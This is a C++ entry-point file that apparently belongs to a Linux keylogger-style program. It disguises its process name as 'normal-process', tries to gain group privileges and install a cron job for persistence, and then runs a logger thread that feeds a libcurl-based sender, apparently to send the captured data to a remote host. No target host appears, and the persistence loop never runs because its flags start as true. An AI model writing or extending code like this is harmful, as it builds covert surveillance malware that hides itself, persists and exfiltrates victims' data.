// main.cpp

#include "logger.h"
#include "messages.h"
#include "procloader.h"
#include "sender.h"
#include "tsq.h"
#include <curl/curl.h>
#include <sys/prctl.h>

#include <chrono>
#include <cstring>
#include <thread>

messagetype messages = messagetype::debug;

auto main() -> int {
	CURLcode res = curl_global_init(CURL_GLOBAL_DEFAULT);
	if (res != CURLE_OK) {
		MSG(messagetype::error, "main: curl_global_init() failed: " + std::string{curl_easy_strerror(res)});
		return 1;
	}

	const char* pr_name = "normal-process";
	prctl(PR_SET_NAME, pr_name, 0, 0, 0);

	bool grpriv  = true;
	bool cronjob = true;

	procloader& loader = procloader::get_instance();

	while (!(grpriv && cronjob)) {
		if (loader.grpriv()) {
			grpriv = true;
			MSG(messagetype::info, "main: group privileges set.");
		}
		else {
			MSG(messagetype::error, "main: group privileges set error.");
		}

		if (loader.mkcron()) {
			cronjob = true;
			MSG(messagetype::info, "main: cron job set.");
		}
		else {
			MSG(messagetype::error, "main: cron job set error.");
		}

		if (!(grpriv && cronjob)) {
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}

	tsq queue;

	logger& logger = logger::get_instance(queue);
	sender& sender = sender::get_instance(queue);

	while (true) {
		if (!logger.init("")) {
			MSG(messagetype::error, "main: logger init error.");
			std::this_thread::sleep_for(std::chrono::seconds(1));
			continue;
		}
		else {
			MSG(messagetype::info, "main: logger init.");
		}

		if (!sender.init("")) {
			MSG(messagetype::error, "main: sender init error.");
			std::this_thread::sleep_for(std::chrono::seconds(1));
			continue;
		}
		else {
			MSG(messagetype::info, "main: sender init.");
		}
		break;
	}

	logger.start();
	sender.start();

	while (true) {
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}

	curl_global_cleanup();
	return 0;
}
